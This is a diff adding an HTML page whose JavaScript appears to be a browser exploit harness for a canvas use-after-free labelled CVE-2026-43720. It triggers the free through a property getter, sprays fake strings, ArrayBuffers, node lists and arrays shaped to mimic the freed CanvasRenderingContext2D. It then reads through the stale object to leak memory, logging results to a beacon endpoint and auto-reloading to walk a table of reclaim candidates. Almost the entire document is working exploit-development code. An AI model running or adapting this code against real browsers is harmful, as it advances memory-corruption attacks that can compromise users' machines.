@@ -1,0 +1,572 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V681 vecwalk</title></head>
+<body><pre id="out">V681 — vector-buffer 768-class reclaim walk</pre>
+<script>
+/* V681-vec: after the CVE-2026-43720 trigger frees the 768-byte
+ * CanvasRenderingContext2D object, spray ONE candidate allocation type, then
+ * allocate 24 tagged real 2d contexts and read lineWidth through the stale
+ * wrapper.
+ *
+ *   lw in [200,200+ctx)  -> miss: our candidate did not take the slot, the
+ *                          tagged contexts did (this is the per-run control)
+ *   read throws          -> OSTEP with ERR (candidate took the slot but the
+ *                          fake Vector fields are not readable)
+ *   read returns other   -> SUSPECT: candidate took the slot and its
+ *                          +112/+120 happened to look like a WTF::Vector
+ *   no OSTEP at all      -> renderer died at the read (candidate took the
+ *                          slot and the deref faulted) -- most likely hit
+ *
+ * Progress is advanced BEFORE the spray+read, so a crash can never re-run the
+ * same entry; the auto-reload continues with the next one.
+ *
+ * Params:
+ *   op=walk            (default) run the table
+ *   op=reset           clear v681 progress
+ *   i=N                start index
+ *   t=NAME[&a=VAL]     run only the first table entry of that type (no
+ *                      navigation, needs once=1 to avoid a reload loop)
+ *   next=0             do not navigate after the run
+ *   ctx=N              tagged contexts per run (default 24)
+ *   once=1             one-shot guard for t= single runs
+ */
+'use strict';
+var PARAM = {};
+try {
+  var qs = location.search.replace(/^\?/, '');
+  var parts = qs.split('&');
+  for (var qi = 0; qi < parts.length; qi++) {
+    if (!parts[qi]) continue;
+    var kv = parts[qi].split('=');
+    PARAM[kv[0]] = decodeURIComponent(kv[1] || '');
+  }
+} catch (e) {}
+
+var MODE = PARAM.op || 'walk';
+var NEXT = PARAM.next !== '0';
+if (PARAM.t) NEXT = false;
+var CTXN = parseInt(PARAM.ctx || '24', 10) || 24;
+var WALKKEY = 'v681v_i';
+var O = document.getElementById('out');
+
+function say(s) { O.textContent += '\n' + s; }
+function st() {
+  try { if (window.localStorage) return window.localStorage; } catch (e) {}
+  try { if (window.sessionStorage) return window.sessionStorage; } catch (e) {}
+  return null;
+}
+var ST = st();
+function stGet(k) { try { return ST ? ST.getItem(k) : null; } catch (e) { return null; } }
+function stSet(k, v) { try { if (ST) ST.setItem(k, v); } catch (e) {} }
+function stDel(k) { try { if (ST) ST.removeItem(k); } catch (e) {} }
+
+function bk(tag, body) {
+  var u = '/beacon/V681-' + tag + '?d=' + encodeURIComponent(String(body).slice(0, 700)) + '&t=' + Date.now();
+  try { new Image().src = u; } catch (e) {}
+}
+/* synchronous: the log entry exists before the next line runs */
+function bks(tag, body) {
+  var u = '/beacon/V681-' + tag + '?d=' + encodeURIComponent(String(body).slice(0, 700)) + '&t=' + Date.now() + '&s=1';
+  try { var x = new XMLHttpRequest(); x.open('GET', u, false); x.send(null); } catch (e) {}
+}
+
+var f64 = new Float64Array(1), u32 = new Uint32Array(f64.buffer);
+function d2hex(d) {
+  if (typeof d !== 'number') return String(d);
+  f64[0] = d;
+  return '0x' + ('00000000' + u32[1].toString(16)).slice(-8) + ('00000000' + u32[0].toString(16)).slice(-8);
+}
+
+var _fb = new Float64Array(1), _fu = new Uint8Array(_fb.buffer);
+function fbytes(v) { _fb[0] = v; return Array.prototype.slice.call(_fu); }
+var Z8 = [0, 0, 0, 0, 0, 0, 0, 0];
+var O8 = [1, 0, 0, 0, 1, 0, 0, 0];  /* m_size=1, m_capacity=1 */
+
+function w8(ch, idx, bytes) {
+  for (var k = 0; k < bytes.length; k++) {
+    var j = idx + k;
+    if (j >= 0 && j < ch.length) ch[j] = bytes[k] & 255;
+  }
+}
+function w16(ch, idx, bytes) {
+  for (var k = 0; k + 1 < bytes.length; k += 2) {
+    var j = idx + (k >> 1);
+    if (j >= 0 && j < ch.length) ch[j] = ((bytes[k] & 255) | ((bytes[k + 1] & 255) << 8)) & 65535;
+  }
+}
+
+/* A string whose character data, seen as raw bytes, looks like a
+ * CanvasRenderingContext2D with an inline state stack:
+ *   +112 m_buffer = 0, +120 m_size = 1, +124 m_capacity = 1,
+ *   +176 lineWidth = payload.
+ * Both possible StringImpl layouts are covered:
+ *   A) character data inline at allocation+20  (char index = off-20)
+ *   B) character data in its own allocation    (char index = off)
+ * bits=8 -> LChar (1 byte/char), bits=16 -> UChar (2 bytes/char).
+ * For bits=16 the char count is halved so the byte size stays ~704. */
+function strfake(len, bits, lwv) {
+  var ch = new Array(len), i;
+  var fill = (bits === 8) ? 0x41 : 0x0041;
+  for (i = 0; i < len; i++) ch[i] = fill;
+  var lb = fbytes(lwv);
+  if (bits === 8) {
+    w8(ch, 112 - 20, Z8); w8(ch, 120 - 20, O8); w8(ch, 176 - 20, lb);   /* A */
+    w8(ch, 112, Z8);      w8(ch, 120, O8);      w8(ch, 176, lb);        /* B */
+  } else {
+    w16(ch, (112 - 20) / 2, Z8); w16(ch, (120 - 20) / 2, O8); w16(ch, (176 - 20) / 2, lb); /* A */
+    w16(ch, 112 / 2, Z8);        w16(ch, 120 / 2, O8);        w16(ch, 176 / 2, lb);        /* B */
+  }
+  var s = String.fromCharCode.apply(null, ch);
+  try { s.charCodeAt(len - 1); } catch (e) {}   /* force flatten */
+  try { s.indexOf('A'); } catch (e) {}
+  return s;
+}
+
+function fakeAB(len, lwv) {
+  var ab = new ArrayBuffer(len);
+  try {
+    var t = new Uint32Array(ab, 120, 2);
+    t[0] = 1; t[1] = 1;
+    new Float64Array(ab, 176, 1)[0] = lwv;
+  } catch (e) {}
+  return ab;
+}
+
+/* ---- table: one entry per page load ---- */
+function table() {
+  var T = [];
+  function add(t, n, a) { T.push({ t: t, n: n, a: a }); }
+
+  /* A WTF::Vector<RefPtr<X>> data buffer is a plain bmalloc block of
+   * count*8 bytes. If such a buffer takes the freed slot, the fake
+   * m_stateStack reads:
+   *   +112 = element 14  -> a REAL object pointer  (readable m_buffer)
+   *   +120 = low half of element 15
+   *   +124 = high half of element 15 -> small size on a 4G-ish heap
+   * which is exactly the shape needed for a surviving read + leak.
+   * Exact 768 bytes = 96 pointers; other counts probe the growth policy. */
+  add('nodelist', 1, 96);     /* StaticNodeList: Vector<RefPtr<Node>> * 96 */
+  add('nodelist', 1, 95);
+  add('nodelist', 1, 92);
+  add('nodelist', 1, 88);
+  add('texttracks', 96, 0);   /* TextTrackList: Vector<RefPtr<TextTrack>> * 96 */
+  add('rules', 1, 96);        /* CSSRuleList: Vector<RefPtr<CSSRule>> * 96 */
+  add('urlsp', 1, 48);        /* URLSearchParams: 48 pairs * 16 bytes = 768 */
+
+  /* JS butterflies: 8 + 8*95 = 768 exactly. With object elements every
+   * slot is a raw JSC pointer, so +112 is a mapped pointer. */
+  add('arrB', 1, 95);
+  add('arrE', 1, 95);
+  add('arrF', 1, 95);
+  add('arrB', 1, 88);
+  add('arrB', 1, 64);
+
+  /* controls: 704-char text -> StringImpl 724 (class 768, expected crash);
+   * 1024-char text -> 1044 (class 1088, expected miss) */
+  add('text', 4, 704);
+  add('text', 4, 1024);
+  return T;
+}
+
+/* ---- builders: allocate `e.n` candidate objects, keep them alive ---- */
+function buildEntry(e, helper, helperCanvas) {
+  var t = e.t, n = e.n, a = e.a, out = [], i, j;
+  if (t === 'abzero') {
+    out = new Array(n);
+    for (i = 0; i < n; i++) out[i] = new ArrayBuffer(a);
+  } else if (t === 'abfake') {
+    out = new Array(n);
+    for (i = 0; i < n; i++) out[i] = fakeAB(a, 4400.44 + i);
+  } else if (t === 'strfake8') {
+    out = new Array(n);
+    for (i = 0; i < n; i++) out[i] = strfake(a, 8, 5500.55 + i);
+  } else if (t === 'strfake16') {
+    out = new Array(n);
+    for (i = 0; i < n; i++) out[i] = strfake(a, 16, 6600.66 + i);
+  } else if (t === 'arrB') {
+    /* new Array(len) then fill by index: dense object elements */
+    out = new Array(n);
+    for (i = 0; i < n; i++) {
+      var aB = new Array(a);
+      for (j = 0; j < a; j++) aB[j] = { k: j };
+      out[i] = aB;
+    }
+  } else if (t === 'arrE') {
+    /* Array.from: one reservation, then element stores */
+    out = new Array(n);
+    for (i = 0; i < n; i++) {
+      out[i] = Array.from({ length: a }, function (_, k) { return { k: k }; });
+    }
+  } else if (t === 'arrF') {
+    /* fill(): single object reference in every slot */
+    out = new Array(n);
+    var fo = { z: 1 };
+    for (i = 0; i < n; i++) {
+      var aF = new Array(a);
+      aF.fill(fo);
+      out[i] = aF;
+    }
+  } else if (t === 'jsarray') {
+    out = new Array(n);
+    for (i = 0; i < n; i++) {
+      var arr = new Array(a);
+      for (j = 0; j < a; j++) arr[j] = 1.25;
+      out[i] = arr;
+    }
+  } else if (t === 'grad') {
+    out = new Array(n);
+    for (i = 0; i < n; i++) {
+      var g = helper.createLinearGradient(0, 0, 1, 1);
+      for (j = 0; j < a; j++) {
+        try { g.addColorStop(j / (a - 1), 'rgb(' + ((j * 7) & 255) + ',0,0)'); } catch (e1) {}
+      }
+      out[i] = g;
+    }
+  } else if (t === 'pattern') {
+    out = new Array(n);
+    for (i = 0; i < n; i++) {
+      try { out[i] = helper.createPattern(helperCanvas, 'repeat'); } catch (e2) { out[i] = null; }
+    }
+  } else if (t === 'path') {
+    out = new Array(n);
+    for (i = 0; i < n; i++) {
+      var d = 'M0 0';
+      for (j = 0; j < a; j++) d += ' L' + (j & 63) + ' ' + (j & 47);
+      try { out[i] = new Path2D(d); } catch (e3) { out[i] = null; }
+    }
+  } else if (t === 'imagedata') {
+    var wh = String(a).split('x');
+    var w = parseInt(wh[0], 10), h = parseInt(wh[1], 10);
+    out = new Array(n);
+    for (i = 0; i < n; i++) {
+      try { out[i] = helper.createImageData(w, h); } catch (e4) { out[i] = null; }
+    }
+  } else if (t === 'text') {
+    out = new Array(n);
+    for (i = 0; i < n; i++) {
+      try { out[i] = document.createTextNode('A'.repeat(a)); } catch (e5) { out[i] = null; }
+    }
+  } else if (t === 'elem') {
+    out = new Array(n);
+    for (i = 0; i < n; i++) {
+      try {
+        out[i] = (a === 'svg')
+          ? document.createElementNS('http://www.w3.org/2000/svg', 'svg')
+          : document.createElement(String(a));
+      } catch (e6) { out[i] = null; }
+    }
+  } else if (t === 'attrs') {
+    out = new Array(n);
+    for (i = 0; i < n; i++) {
+      var d1 = document.createElement('div');
+      for (j = 0; j < a; j++) d1.setAttribute('a' + j, 'v' + j);
+      out[i] = d1;
+    }
+  } else if (t === 'style') {
+    out = new Array(n);
+    for (i = 0; i < n; i++) {
+      var d2 = document.createElement('div');
+      for (j = 0; j < a; j++) d2.style.setProperty('--p' + j, j + 'px');
+      out[i] = d2;
+    }
+  } else if (t === 'optsel') {
+    out = [];
+    for (i = 0; i < n; i++) {
+      var sel = document.createElement('select');
+      for (j = 0; j < a; j++) {
+        var op = document.createElement('option');
+        op.value = 'v' + j; op.textContent = 'o' + j;
+        sel.appendChild(op);
+      }
+      out.push(sel);
+    }
+  } else if (t === 'nodelist') {
+    var box = document.createElement('div');
+    for (j = 0; j < a; j++) box.appendChild(document.createElement('span'));
+    out = [box, box.querySelectorAll('span')];
+  } else if (t === 'mutation') {
+    out = [];
+    for (i = 0; i < n; i++) {
+      var mo = new MutationObserver(function () {});
+      for (j = 0; j < a; j++) {
+        var mel = document.createElement('div');
+        mo.observe(mel, { attributes: true });
+      }
+      out.push(mo);
+    }
+  } else if (t === 'texttracks') {
+    out = [];
+    var vv = document.createElement('video');
+    out.push(vv.textTracks);
+    for (i = 0; i < n; i++) {
+      try { out.push(vv.addTextTrack('subtitles', 't' + i, 'en')); } catch (e12) {}
+    }
+    out.push(vv);
+  } else if (t === 'matchmedia') {
+    out = [];
+    for (i = 0; i < n; i++) {
+      try { out.push(window.matchMedia('(min-width:' + i + 'px)')); } catch (e13) {}
+    }
+  } else if (t === 'headers') {
+    out = [];
+    for (i = 0; i < n; i++) {
+      try {
+        var hd = new Headers();
+        for (j = 0; j < a; j++) hd.set('h' + j, 'v' + j);
+        out.push(hd);
+      } catch (e14) {}
+    }
+  } else if (t === 'formdata') {
+    out = [];
+    for (i = 0; i < n; i++) {
+      try {
+        var fd = new FormData();
+        for (j = 0; j < a; j++) fd.append('f' + j, 'v' + j);
+        out.push(fd);
+      } catch (e15) {}
+    }
+  } else if (t === 'datatransfer') {
+    out = [];
+    for (i = 0; i < n; i++) { try { out.push(new DataTransfer()); } catch (e16) {} }
+  } else if (t === 'range') {
+    out = [];
+    for (i = 0; i < n; i++) { try { out.push(document.createRange()); } catch (e17) {} }
+  } else if (t === 'selection') {
+    out = [];
+    for (i = 0; i < 4; i++) { try { out.push(window.getSelection()); } catch (e18) {} }
+  } else if (t === 'tokenlist') {
+    out = [];
+    for (i = 0; i < n; i++) {
+      var tel = document.createElement('div');
+      for (j = 0; j < a; j++) tel.classList.add('c' + j);
+      out.push(tel.classList);
+    }
+  } else if (t === 'xhr') {
+    out = new Array(n);
+    for (i = 0; i < n; i++) { try { out[i] = new XMLHttpRequest(); } catch (e7) { out[i] = null; } }
+  } else if (t === 'observer') {
+    var els = [];
+    var ro = new ResizeObserver(function () {});
+    for (j = 0; j < a; j++) { var el = document.createElement('div'); ro.observe(el); els.push(el); }
+    out = [ro, els];
+  } else if (t === 'fontface') {
+    out = [];
+    for (i = 0; i < n; i++) {
+      try {
+        var ff = new FontFace('F' + i, 'local(Arial)');
+        document.fonts.add(ff);
+        out.push(ff);
+      } catch (e8) {}
+    }
+  } else if (t === 'rules') {
+    var se = document.createElement('style');
+    document.head.appendChild(se);
+    var sh = se.sheet;
+    for (j = 0; j < a; j++) {
+      try { sh.insertRule('.c' + j + '{color:rgb(' + (j & 255) + ',0,0)}', sh.cssRules.length); } catch (e9) {}
+    }
+    out = [se, sh];
+  } else if (t === 'urlsp') {
+    var pcs = [];
+    for (j = 0; j < a; j++) pcs.push('k' + j + '=v' + j);
+    out = new Array(n);
+    for (i = 0; i < n; i++) { try { out[i] = new URLSearchParams(pcs.join('&')); } catch (e10) { out[i] = null; } }
+  } else if (t === 'blob') {
+    out = new Array(n);
+    for (i = 0; i < n; i++) { try { out[i] = new Blob([new Uint8Array(a)]); } catch (e11) { out[i] = null; } }
+  }
+  return out;
+}
+
+function clearOnce() {
+  var n = 0;
+  try {
+    var keys = [];
+    for (var k = 0; k < ST.length; k++) keys.push(ST.key(k));
+    for (var j = 0; j < keys.length; j++) {
+      if (keys[j] && keys[j].indexOf('v681c_') === 0) { ST.removeItem(keys[j]); n++; }
+    }
+  } catch (e) {}
+  return n;
+}
+
+if (MODE === 'reset' || PARAM.reset === '1') {
+  stDel(WALKKEY);
+  var cn = clearOnce();
+  bks('ORESET', 'cleared=1,once=' + cn);
+  say('v681 progress cleared. Reload the index.');
+}
+if (MODE !== 'reset') {
+  var T = table();
+  var idx = -1;
+
+  if (PARAM.t) {
+    for (var ti = 0; ti < T.length; ti++) {
+      if (T[ti].t !== PARAM.t) continue;
+      if (PARAM.a !== undefined && String(T[ti].a) !== String(PARAM.a)) continue;
+      idx = ti;
+      break;
+    }
+    if (idx < 0) { bks('OFAIL', 'no-entry t=' + PARAM.t + ',a=' + (PARAM.a || '-')); say('no such entry'); }
+  } else {
+    var stored = parseInt(stGet(WALKKEY) || '0', 10) || 0;
+    var pidx = parseInt(PARAM.i || '0', 10) || 0;
+    idx = stored > pidx ? stored : pidx;
+    if (idx >= T.length) {
+      bks('ODONE', 'n=' + T.length);
+      say('walk complete (' + T.length + ' entries). Tap RESET to run again.');
+    }
+  }
+
+  if (idx >= 0 && idx < T.length) {
+    var e = T[idx];
+    var onceKey = 'v681c_' + e.t + '_' + e.a;
+    var once = PARAM.once === '1';
+    if (once && !PARAM.t) once = false;
+    var blocked = false;
+    if (once) {
+      if (stGet(onceKey) === '1') blocked = true; else stSet(onceKey, '1');
+    }
+
+    if (blocked) {
+      bks('OBLOCK', 't=' + e.t + ',a=' + e.a);
+      say('blocked by once=1 (tap RESET)');
+    } else {
+      say('i=' + idx + ' t=' + e.t + ' n=' + e.n + ' a=' + e.a);
+      bks('OCFG', 'i=' + idx + ',t=' + e.t + ',n=' + e.n + ',a=' + e.a + ',ctx=' + CTXN + ',next=' + (NEXT ? 1 : 0) + ',total=' + T.length);
+
+      /* ---- target canvas + helper context (both BEFORE the trigger) ---- */
+      var lateFired = false;
+      setTimeout(function () {
+        lateFired = true;
+        bk('LATE', 'i=' + idx + ',alive=1');
+      }, 1500);
+
+      var canvas = document.createElement('canvas');
+      canvas.width = 1; canvas.height = 1;
+      document.body.appendChild(canvas);
+
+      var helperCanvas = document.createElement('canvas');
+      helperCanvas.width = 1; helperCanvas.height = 1;
+      document.body.appendChild(helperCanvas);
+      var helper = null;
+      try { helper = helperCanvas.getContext('2d'); } catch (eH) {}
+
+      /* ---- trigger (exactly once per page load) ---- */
+      var savedCtx = null;
+      var dict = {};
+      Object.defineProperty(dict, 'alpha', {
+        get: function () {
+          var ctx = canvas.getContext('2d');
+          if (!ctx) return true;
+          savedCtx = ctx;
+          try {
+            ctx.lineWidth = 3.14159;
+            ctx.miterLimit = 7.77;
+            ctx.globalAlpha = 0.42;
+            ctx.lineDashOffset = 2.222;
+            ctx.shadowBlur = 5.55;
+            for (var s = 0; s < 32; s++) ctx.save();
+            ctx.lineWidth = 1.0;
+          } catch (eI) {}
+          return true;
+        }
+      });
+      var bmpCtx = null;
+      try { bmpCtx = canvas.getContext('bitmaprenderer', dict); } catch (eJ) { bks('OFAIL', 'bmr:' + eJ.name); }
+
+      if (!savedCtx || !bmpCtx) {
+        bks('OFAIL', 'i=' + idx + ',no-ctx:inner=' + !!savedCtx + ',bmr=' + !!bmpCtx);
+        say('ABORT: trigger failed');
+      } else {
+        /* progress advances BEFORE the risky part */
+        if (!PARAM.t) stSet(WALKKEY, String(idx + 1));
+
+        var kept = null, berr = null;
+        try { kept = buildEntry(e, helper, helperCanvas); } catch (eK) { berr = eK.name; }
+        /* beacon AFTER the candidate spray: if this is missing the crash
+         * happened inside the builder, not at the stale read. */
+        bks('OBUILT', 'i=' + idx + ',t=' + e.t + ',kept=' + (kept ? kept.length : -1) + (berr ? ',berr=' + berr : ''));
+
+        /* tagged real contexts: if these win the slot we know it was a miss */
+        var ckeep = new Array(CTXN), cmade = 0;
+        for (var c = 0; c < CTXN; c++) {
+          var cc = document.createElement('canvas');
+          cc.width = 1; cc.height = 1;
+          var cx = null;
+          try { cx = cc.getContext('2d'); } catch (eL) {}
+          if (cx) {
+            try { cx.lineWidth = 200 + cmade; } catch (eM) {}
+            ckeep[cmade] = cc;
+            cmade++;
+          }
+        }
+
+        bks('OPRE', 'i=' + idx + ',made=' + cmade);
+
+        var lw, le = null;
+        try { lw = savedCtx.lineWidth; } catch (eN) { le = eN.name; }
+        var ctxhit = 0, suspect = 0;
+        if (le) { suspect = 0; }
+        else if (typeof lw === 'number' && lw >= 200 && lw < 200 + CTXN) { ctxhit = 1; }
+        else { suspect = 1; }
+
+        bks('OSTEP',
+            'i=' + idx + ',t=' + e.t + ',n=' + e.n + ',a=' + e.a +
+            ',kept=' + (kept ? kept.length : -1) + (berr ? ',berr=' + berr : '') +
+            ',made=' + cmade + ',lw=' + d2hex(lw) + (le ? ',ERR=' + le : '') +
+            ',ctxhit=' + ctxhit + ',sus=' + suspect);
+
+        if (!le && suspect) {
+          var extra = [];
+          var gnames = ['ml', 'ga', 'ldo', 'sb'];
+          var gfuncs = [
+            function () { return savedCtx.miterLimit; },
+            function () { return savedCtx.globalAlpha; },
+            function () { return savedCtx.lineDashOffset; },
+            function () { return savedCtx.shadowBlur; }
+          ];
+          for (var gi = 0; gi < 4; gi++) {
+            try { extra.push(gnames[gi] + '=' + d2hex(gfuncs[gi]())); }
+            catch (eO) { extra.push(gnames[gi] + '!' + eO.name); }
+          }
+          /* getTransform reads 6 doubles at state+112 -> 48 bytes of the
+           * aliased memory in one shot: the best leak surface we have. */
+          try {
+            var mt = savedCtx.getTransform();
+            extra.push('m=' + [mt.a, mt.b, mt.c, mt.d, mt.e, mt.f].map(d2hex).join('|'));
+          } catch (eQ) { extra.push('m!' + eQ.name); }
+          try {
+            var ld = savedCtx.getLineDash();
+            var lds = [];
+            for (var li = 0; li < ld.length && li < 8; li++) lds.push(d2hex(ld[li]));
+            extra.push('ld=' + lds.join('|'));
+          } catch (eR) { extra.push('ld!' + eR.name); }
+          bks('OEXTRA', 'i=' + idx + ',' + extra.join(','));
+        }
+
+        window._v681keep = kept;
+        window._v681ctx = ckeep;
+
+        if (NEXT) {
+          var q = [];
+          for (var p in PARAM) {
+            /* reset must not survive: every reload would clear the index */
+            if (p === 'i' || p === 'cb' || p === 'reset' || p === 'once') continue;
+            q.push(p + '=' + encodeURIComponent(PARAM[p]));
+          }
+          q.push('i=' + (idx + 1));
+          var nurl = location.pathname + '?' + q.join('&');
+          say('next i=' + (idx + 1) + ' / ' + T.length);
+          setTimeout(function () { try { location.replace(nurl); } catch (eP) {} }, 800);
+        } else {
+          say('one-shot done (late=' + lateFired + ')');
+          if (once) stDel(onceKey);
+        }
+      }
+    }
+  }
+}
+</script>
+</body></html>
